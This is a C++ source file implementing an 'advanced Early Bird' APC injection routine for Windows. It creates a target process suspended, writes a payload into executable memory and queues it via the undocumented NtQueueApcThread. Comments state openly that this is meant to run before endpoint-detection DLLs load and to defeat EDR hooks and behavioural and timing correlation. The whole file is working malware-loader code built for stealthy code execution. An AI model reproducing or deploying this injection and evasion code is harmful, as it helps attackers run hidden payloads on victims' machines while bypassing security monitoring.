#include "stdafx.h"
#include "early_bird_adv.h"
#include "logger.h"
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI NtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcRoutineContext,
    PVOID ApcStatusBlock,
    PVOID ApcReserved
);

namespace EarlyBirdAdv {

struct ApcInjectContext {
    HANDLE hThread;
    PVOID pPayloadAddress;
};

// Queue APC from a standalone background thread to break EDR behavioral sequences
// occurring on the main injector thread.
DWORD WINAPI BackgroundApcQueuer(LPVOID lpParam) {
    auto* ctx = reinterpret_cast<ApcInjectContext*>(lpParam);
    
    // Sleep briefly to simulate async processing decoupling
    Sleep(50);

    // Queue the APC using the undocumented Nt function to avoid kernel32.dll hooks
    NTSTATUS status = NtQueueApcThread(
        ctx->hThread, 
        ctx->pPayloadAddress, 
        nullptr, nullptr, nullptr
    );

    if (!NT_SUCCESS(status)) {
        LOG(L"EarlyBirdAdv: NtQueueApcThread failed: 0x%08X", status);
        return 1;
    }

    return 0;
}

bool InjectAdvancedEarlyBird(const wchar_t* targetExePath, const void* pPayload, size_t payloadSize) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // 1. Create the target process suspended
    if (!CreateProcessW(
            targetExePath, nullptr, nullptr, nullptr, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            nullptr, nullptr, &si, &pi)) {
        LOG(L"EarlyBirdAdv: Failed to create suspended process. Error: %u", GetLastError());
        return false;
    }

    VERBOSE(L"EarlyBirdAdv: Target process created suspended (PID: %lu, TID: %lu)",
            pi.dwProcessId, pi.dwThreadId);

    // 2. Allocate and map the payload
    PVOID pRemotePayload = VirtualAllocEx(
        pi.hProcess, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pRemotePayload) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, pRemotePayload, pPayload, payloadSize, &written)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // 3. Delegate the APC queuing to a background thread to break correlation
    ApcInjectContext apcCtx;
    apcCtx.hThread = pi.hThread;
    apcCtx.pPayloadAddress = pRemotePayload;

    HANDLE hApcThread = CreateThread(nullptr, 0, BackgroundApcQueuer, &apcCtx, 0, nullptr);
    if (!hApcThread) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // Wait for the background thread to finish queueing the APC
    WaitForSingleObject(hApcThread, INFINITE);
    DWORD exitCode = 1;
    GetExitCodeThread(hApcThread, &exitCode);
    CloseHandle(hApcThread);

    if (exitCode != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // 4. Sleep briefly again before resuming to bypass EDR timing correlations
    Sleep(50);

    // 5. Resume the main thread. As process initialization begins, the APC will 
    // fire executing our payload before EDR DLLs are fully loaded.
    ResumeThread(pi.hThread);

    VERBOSE(L"EarlyBirdAdv: Payload successfully queued and main thread resumed.");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

} // namespace EarlyBirdAdv
